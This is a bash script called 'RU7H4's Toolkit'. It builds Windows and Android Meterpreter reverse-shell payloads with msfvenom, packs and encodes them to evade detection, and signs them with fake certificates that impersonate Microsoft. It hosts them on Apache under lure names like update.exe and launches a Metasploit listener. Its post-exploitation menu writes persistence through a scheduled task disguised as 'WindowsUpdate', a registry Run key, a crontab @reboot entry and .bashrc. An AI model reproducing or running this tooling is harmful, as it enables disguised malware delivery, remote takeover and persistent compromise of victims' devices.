#!/bin/bash
clear
echo -e "\e[91m"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░░▒▓████████▓▒░▒▓████████▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo -e "\e[0m"
echo -e "\e[1;36mRU7H4's Toolkit\e[0m"
echo "--------------"
echo -e "\e[92m[1]\e[0m \e[1;34mDevices (Windows/Android)\e[0m"
echo -e "\e[92m[2]\e[0m \e[1;34mPost-Exploitation\e[0m"
echo -e "\e[92m[3]\e[0m \e[1;34mPort Forwarding\e[0m"
read -p "Select an option (1-3): " MAIN_OPTION

check_requirements() {
    local tools=("$@")
    for tool in "${tools[@]}"; do
        if ! command -v $tool &>/dev/null; then
            echo -e "\e[91m[!] $tool is not installed. Please install it to continue.\e[0m"
            exit 1
        fi
    done
}

if [[ $MAIN_OPTION -eq 1 ]]; then
    echo -e "\e[92m[1]\e[0m \e[1;34mWindows\e[0m"
    echo -e "\e[92m[2]\e[0m \e[1;34mAndroid\e[0m"
    read -p "Select a device type (1 or 2): " DEVICE_TYPE
    if [[ $DEVICE_TYPE -eq 1 ]]; then
        check_requirements "msfvenom apache2"
        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output payload name (e.g., update.exe): " PAYLOAD_NAME
        echo -e "\e[93m[+] Generating Windows payload with obfuscation...\e[0m"
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 10 -f exe -o raw_$PAYLOAD_NAME
        if [ -s raw_$PAYLOAD_NAME ]; then
            echo -e "\e[93m[+] Applying UPX obfuscation...\e[0m"
            if command -v upx &>/dev/null; then
                upx --best --lzma raw_$PAYLOAD_NAME -o $PAYLOAD_NAME
                rm raw_$PAYLOAD_NAME
            else
                echo -e "\e[91m[!] UPX not installed, renaming raw payload.\e[0m"
                mv raw_$PAYLOAD_NAME $PAYLOAD_NAME
            fi
            echo -e "\e[93m[+] Signing payload with fake certificate...\e[0m"
            if command -v osslsigncode &>/dev/null; then
                openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=Microsoft Corporation"
                osslsigncode sign -certs cert.pem -key key.pem -in $PAYLOAD_NAME -out signed_$PAYLOAD_NAME
                mv signed_$PAYLOAD_NAME $PAYLOAD_NAME
                rm key.pem cert.pem
            else
                echo -e "\e[91m[!] osslsigncode not installed, skipping signing.\e[0m"
            fi
            echo -e "\e[93m[+] Setting up Apache server...\e[0m"
            systemctl start apache2
            systemctl enable apache2
            WEB_DIR="/var/www/html"
            cp $PAYLOAD_NAME $WEB_DIR/
            echo -e "\e[92m[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME\e[0m"
        else
            echo -e "\e[91m[-] Payload generation failed. Check msfvenom parameters.\e[0m"
            exit 1
        fi
        cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
        echo -e "\e[92m[+] Metasploit Listener script saved as listener.rc\e[0m"
        echo -e "\e[92m[+] Starting Metasploit Listener...\e[0m"
        msfconsole -r listener.rc
    elif [[ $DEVICE_TYPE -eq 2 ]]; then
        check_requirements "msfvenom apache2 apktool jarsigner"
        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output APK name (e.g., update.apk): " PAYLOAD_NAME
        echo -e "\e[93m[+] Generating Android payload with obfuscation...\e[0m"
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o raw_$PAYLOAD_NAME
        if [ -s raw_$PAYLOAD_NAME ]; then
            echo -e "\e[93m[+] Obfuscating APK using APKTool...\e[0m"
            apktool d raw_$PAYLOAD_NAME -o temp_apk
            apktool b temp_apk -o $PAYLOAD_NAME
            rm -rf temp_apk raw_$PAYLOAD_NAME
            echo -e "\e[93m[+] Signing APK with fake certificate...\e[0m"
            keytool -genkey -v -keystore fake.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Android"
            jarsigner -verbose -keystore fake.keystore -storepass password -keypass password $PAYLOAD_NAME android
            rm fake.keystore
            echo -e "\e[93m[+] Setting up Apache server...\e[0m"
            systemctl start apache2
            systemctl enable apache2
            WEB_DIR="/var/www/html"
            cp $PAYLOAD_NAME $WEB_DIR/
            echo -e "\e[92m[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME\e[0m"
        else
            echo -e "\e[91m[-] Payload generation failed. Check msfvenom parameters.\e[0m"
            exit 1
        fi
        cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
        echo -e "\e[92m[+] Metasploit Listener script saved as listener.rc\e[0m"
        echo -e "\e[92m[+] Starting Metasploit Listener...\e[0m"
        msfconsole -r listener.rc
    else
        echo -e "\e[91m[-] Invalid device option!\e[0m"
        exit 1
    fi
elif [[ $MAIN_OPTION -eq 2 ]]; then
    echo -e "\e[92m[+] Post-Exploitation Options:\e[0m"
    echo -e "\e[92m[1]\e[0m \e[1;34mWindows Persistence\e[0m"
    echo -e "\e[92m[2]\e[0m \e[1;34mLinux Persistence\e[0m"
    echo -e "\e[92m[3]\e[0m \e[1;34mAndroid Persistence\e[0m"
    read -p "Select an option (1-3): " PERSIST_OPTION
    case $PERSIST_OPTION in
        1)
            read -p "Enter payload name (e.g., backdoor.exe): " PAYLOAD_NAME
            echo -e "\e[93m[+] Setting up Windows persistence...\e[0m"
            cat <<EOF > win_persist.bat
@echo off
schtasks /create /tn "WindowsUpdate" /tr "\"C:\\Users\\Public\\$PAYLOAD_NAME\"" /sc ONLOGON /rl HIGHEST
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "\"C:\\Users\\Public\\$PAYLOAD_NAME\"" /f
EOF
            echo -e "\e[92m[+] Windows persistence script saved as win_persist.bat\e[0m"
            ;;
        2)
            read -p "Enter payload path (e.g., /home/user/backdoor): " PAYLOAD_PATH
            echo -e "\e[93m[+] Setting up Linux persistence...\e[0m"
            (crontab -l 2>/dev/null; echo "@reboot $PAYLOAD_PATH &") | crontab -
            echo "$PAYLOAD_PATH &" >> ~/.bashrc
            echo -e "\e[92m[+] Linux persistence configured.\e[0m"
            ;;
        3)
            read -p "Enter payload path on Android device (e.g., /sdcard/update.apk): " PAYLOAD_PATH
            echo -e "\e[93m[+] Setting up Android persistence...\e[0m"
            echo "am start -a android.intent.action.VIEW -n com.android.packageinstaller/.PackageInstallerActivity -d file://$PAYLOAD_PATH" > android_persist.sh
            echo -e "\e[92m[+] Android persistence script saved as android_persist.sh\e[0m"
            ;;
        *)
            echo -e "\e[91m[-] Invalid option!\e[0m"
            exit 1
            ;;
    esac
elif [[ $MAIN_OPTION -eq 3 ]]; then
    read -p "Enter the port or ports to forward (comma-separated, e.g., 8080,443): " FORWARD_PORTS
    IFS=',' read -r -a PORTS <<< "$FORWARD_PORTS"
    echo -e "\e[93m[+] Forwarding the following ports: ${PORTS[@]}\e[0m"
    for PORT in "${PORTS[@]}"; do
        echo -e "\e[93m[+] Forwarding port $PORT...\e[0m"
        iptables -t nat -A PREROUTING -p tcp --dport $PORT -j DNAT --to-destination $LHOST:$PORT
        iptables -t nat -A POSTROUTING -p tcp --dport $PORT -j MASQUERADE
    done
    echo -e "\e[92m[+] Ports have been forwarded. You can now access services at $LHOST.\e[0m"
else
    echo -e "\e[91m[-] Invalid option!\e[0m"
    exit 1
fi
